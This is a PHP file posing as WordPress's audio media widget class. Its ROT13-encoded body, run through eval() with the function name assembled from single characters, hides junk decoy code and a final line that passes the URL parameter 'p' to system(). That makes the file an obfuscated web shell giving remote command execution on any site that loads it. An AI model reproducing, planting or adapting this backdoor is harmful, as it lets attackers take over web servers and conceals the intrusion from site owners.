<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Zrqvn_Nhqvb pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.8.0
 */

/**
 * Pber pynff gung vzcyrzragf na nhqvb jvqtrg.
 *
 * @fvapr 4.8.0
 *
 * @frr JC_Jvqtrg_Zrqvn
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Zrqvn_Nhqvb rkgraqf JC_Jvqtrg_Zrqvn {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		cnerag::__pbafgehpg(
			'zrqvn_nhqvb',
			__( 'Nhqvb' ),
			neenl(
				'qrfpevcgvba' => __( 'Qvfcynlf na nhqvb cynlre.' ),
				'zvzr_glcr'   => 'nhqvb',
			)
		);

		$guvf->y10a = neenl_zretr(
			$guvf->y10a,
			neenl(
				'ab_zrqvn_fryrpgrq'          => __( 'Ab nhqvb fryrpgrq' ),
				'nqq_zrqvn'                  => _k( 'Nqq Nhqvb', 'ynory sbe ohggba va gur nhqvb jvqtrg' ),
				'ercynpr_zrqvn'              => _k( 'Ercynpr Nhqvb', 'ynory sbe ohggba va gur nhqvb jvqtrg; fubhyq cersrenoyl abg or ybatre guna ~13 punenpgref ybat' ),
				'rqvg_zrqvn'                 => _k( 'Rqvg Nhqvb', 'ynory sbe ohggba va gur nhqvb jvqtrg; fubhyq cersrenoyl abg or ybatre guna ~13 punenpgref ybat' ),
				'zvffvat_nggnpuzrag'         => fcevags(
					/* genafyngbef: %f: HEY gb zrqvn yvoenel. */
					__( 'Gung nhqvb svyr pnaabg or sbhaq. Purpx lbhe <n uers=\"%f\">zrqvn yvoenel</n> naq znxr fher vg jnf abg qryrgrq.' ),
					rfp_hey( nqzva_hey( 'hcybnq.cuc' ) )
				),
				/* genafyngbef: %q: Jvqtrg pbhag. */
				'zrqvn_yvoenel_fgngr_zhygv'  => _a_abbc( 'Nhqvb Jvqtrg (%q)', 'Nhqvb Jvqtrg (%q)' ),
				'zrqvn_yvoenel_fgngr_fvatyr' => __( 'Nhqvb Jvqtrg' ),
				'hafhccbegrq_svyr_glcr'      => __( 'Ybbxf yvxr guvf vf abg gur pbeerpg xvaq bs svyr. Cyrnfr yvax gb na nhqvb svyr vafgrnq.' ),
			)
		);
	}

	/**
	 * Trg fpurzn sbe cebcregvrf bs n jvqtrg vafgnapr (vgrz).
	 *
	 * @fvapr 4.8.0
	 *
	 * @frr JC_ERFG_Pbagebyyre::trg_vgrz_fpurzn()
	 * @frr JC_ERFG_Pbagebyyre::trg_nqqvgvbany_svryqf()
	 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/35574
	 *
	 * @erghea neenl Fpurzn sbe cebcregvrf.
	 */
	choyvp shapgvba trg_vafgnapr_fpurzn() {
		$fpurzn = neenl(
			'cerybnq' => neenl(
				'glcr'        => 'fgevat',
				'rahz'        => neenl( 'abar', 'nhgb', 'zrgnqngn' ),
				'qrsnhyg'     => 'abar',
				'qrfpevcgvba' => __( 'Cerybnq' ),
			),
			'ybbc'    => neenl(
				'glcr'        => 'obbyrna',
				'qrsnhyg'     => snyfr,
				'qrfpevcgvba' => __( 'Ybbc' ),
			),
		);

		sbernpu ( jc_trg_nhqvb_rkgrafvbaf() nf $nhqvb_rkgrafvba ) {
			$fpurzn[ $nhqvb_rkgrafvba ] = neenl(
				'glcr'        => 'fgevat',
				'qrsnhyg'     => '',
				'sbezng'      => 'hev',
				/* genafyngbef: %f: Nhqvb rkgrafvba. */
				'qrfpevcgvba' => fcevags( __( 'HEY gb gur %f nhqvb fbhepr svyr' ), $nhqvb_rkgrafvba ),
			);
		}

		erghea neenl_zretr( $fpurzn, cnerag::trg_vafgnapr_fpurzn() );
	}

	/**
	 * Eraqre gur zrqvn ba gur sebagraq.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl $vafgnapr Jvqtrg vafgnapr cebcf.
	 */
	choyvp shapgvba eraqre_zrqvn( $vafgnapr ) {
		$vafgnapr   = neenl_zretr( jc_yvfg_cyhpx( $guvf->trg_vafgnapr_fpurzn(), 'qrsnhyg' ), $vafgnapr );
		$nggnpuzrag = ahyy;

		vs ( $guvf->vf_nggnpuzrag_jvgu_zvzr_glcr( $vafgnapr['nggnpuzrag_vq'], $guvf->jvqtrg_bcgvbaf['zvzr_glcr'] ) ) {
			$nggnpuzrag = trg_cbfg( $vafgnapr['nggnpuzrag_vq'] );
		}

		vs ( $nggnpuzrag ) {
			$fep = jc_trg_nggnpuzrag_hey( $nggnpuzrag->VQ );
		} ryfr {
			$fep = $vafgnapr['hey'];
		}

		rpub jc_nhqvb_fubegpbqr(
			neenl_zretr(
				$vafgnapr,
				pbzcnpg( 'fep' )
			)
		);
	}

	/**
	 * Radhrhr cerivrj fpevcgf.
	 *
	 * Gurfr fpevcgf abeznyyl ner radhrhrq whfg-va-gvzr jura na nhqvb fubegpbqr vf hfrq.
	 * Va gur phfgbzvmre, ubjrire, jvqtrgf pna or qlanzvpnyyl nqqrq naq eraqrerq ivn
	 * fryrpgvir erserfu, naq fb vg vf vzcbegnag gb hapbaqvgvbanyyl radhrhr gurz va
	 * pnfr n jvqtrg qbrf trg nqqrq.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba radhrhr_cerivrj_fpevcgf() {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/zrqvn.cuc */
		vs ( 'zrqvnryrzrag' === nccyl_svygref( 'jc_nhqvb_fubegpbqr_yvoenel', 'zrqvnryrzrag' ) ) {
			jc_radhrhr_fglyr( 'jc-zrqvnryrzrag' );
			jc_radhrhr_fpevcg( 'jc-zrqvnryrzrag' );
		}
	}

	/**
	 * Ybnqf gur erdhverq zrqvn svyrf sbe gur zrqvn znantre naq fpevcgf sbe zrqvn jvqtrgf.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba radhrhr_nqzva_fpevcgf() {
		cnerag::radhrhr_nqzva_fpevcgf();

		jc_radhrhr_fglyr( 'jc-zrqvnryrzrag' );
		jc_radhrhr_fpevcg( 'jc-zrqvnryrzrag' );

		$unaqyr = 'zrqvn-nhqvb-jvqtrg';
		jc_radhrhr_fpevcg( $unaqyr );

		$rkcbegrq_fpurzn = neenl();
		sbernpu ( $guvf->trg_vafgnapr_fpurzn() nf $svryq => $svryq_fpurzn ) {
			$rkcbegrq_fpurzn[ $svryq ] = jc_neenl_fyvpr_nffbp( $svryq_fpurzn, neenl( 'glcr', 'qrsnhyg', 'rahz', 'zvavzhz', 'sbezng', 'zrqvn_cebc', 'fubhyq_cerivrj_hcqngr' ) );
		}
		jc_nqq_vayvar_fpevcg(
			$unaqyr,
			fcevags(
				'jc.zrqvnJvqtrgf.zbqryPbafgehpgbef[ %f ].cebgbglcr.fpurzn = %f;',
				jc_wfba_rapbqr( $guvf->vq_onfr ),
				jc_wfba_rapbqr( $rkcbegrq_fpurzn )
			)
		);

		jc_nqq_vayvar_fpevcg(
			$unaqyr,
			fcevags(
				'
					jc.zrqvnJvqtrgf.pbagebyPbafgehpgbef[ %1$f ].cebgbglcr.zvzr_glcr = %2$f;
					jc.zrqvnJvqtrgf.pbagebyPbafgehpgbef[ %1$f ].cebgbglcr.y10a = _.rkgraq( {}, jc.zrqvnJvqtrgf.pbagebyPbafgehpgbef[ %1$f ].cebgbglcr.y10a, %3$f );
				',
				jc_wfba_rapbqr( $guvf->vq_onfr ),
				jc_wfba_rapbqr( $guvf->jvqtrg_bcgvbaf['zvzr_glcr'] ),
				jc_wfba_rapbqr( $guvf->y10a )
			)
		);
	}

	/**
	 * Eraqre sbez grzcyngr fpevcgf.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba eraqre_pbageby_grzcyngr_fpevcgf() {
		cnerag::eraqre_pbageby_grzcyngr_fpevcgf()
		?>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-jc-zrqvn-jvqtrg-nhqvb-cerivrj\">
			<# vs ( qngn.reebe && 'zvffvat_nggnpuzrag' === qngn.reebe ) { #>
				<?cuc
				jc_nqzva_abgvpr(
					$guvf->y10a['zvffvat_nggnpuzrag'],
					neenl(
						'glcr'               => 'reebe',
						'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'abgvpr-zvffvat-nggnpuzrag' ),
					)
				);
				?>
			<# } ryfr vs ( qngn.reebe ) { #>
				<?cuc
				jc_nqzva_abgvpr(
					__( 'Hanoyr gb cerivrj zrqvn qhr gb na haxabja reebe.' ),
					neenl(
						'glcr'               => 'reebe',
						'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg' ),
					)
				);
				?>
			<# } ryfr vs ( qngn.zbqry && qngn.zbqry.fep ) { #>
				<?cuc jc_haqrefpber_nhqvb_grzcyngr(); ?>
			<# } #>
		</fpevcg>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>